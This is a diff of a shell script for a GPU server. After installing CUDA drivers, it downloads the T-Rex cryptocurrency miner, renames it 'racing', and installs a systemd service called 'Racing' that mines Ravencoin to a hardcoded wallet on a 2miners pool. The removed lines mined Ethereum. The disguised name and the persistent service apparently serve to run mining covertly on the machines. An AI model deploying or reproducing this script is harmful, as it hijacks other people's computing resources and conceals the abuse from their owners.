@@ -1,4 +1,3 @@
-cd /home
 myworker=$(date +'%d%m_')
 username=$HOSTNAME
 myworker+=$username
@@ -20,15 +19,10 @@ sudo apt-get install cuda-drivers-fabricmanager-515 -y
 sudo systemctl enable nvidia-fabricmanager
 sudo systemctl start nvidia-fabricmanager
 sudo nvidia-smi mig -cgi 0 -C
-wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
-tar -zxvf t-rex-0.25.12-linux.tar.gz
-mv t-rex racing
-MINWAIT=30
-MAXWAIT=100
-datass=$((MINWAIT+RANDOM % (MAXWAIT-MINWAIT)))
-sleep $datass
-sudo killall racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u bc1qca7a6qerhmr8az0g36297nqqvcgs3an5wq2j03 -p x -w ${myworker}_re\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
+sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
+sudo mv t-rex racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RN9dnTPV1voDLtwS6v6ap7Az9y8BtEnBAs.reminer -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-./racing -a ethash -o us-eth.2miners.com:2020 -u bc1qca7a6qerhmr8az0g36297nqqvcgs3an5wq2j03 -p x -w $myworker &
+./racing -a kawpow -o us-rvn.2miners.com:6060 -u RN9dnTPV1voDLtwS6v6ap7Az9y8BtEnBAs.${myworker} -p x &
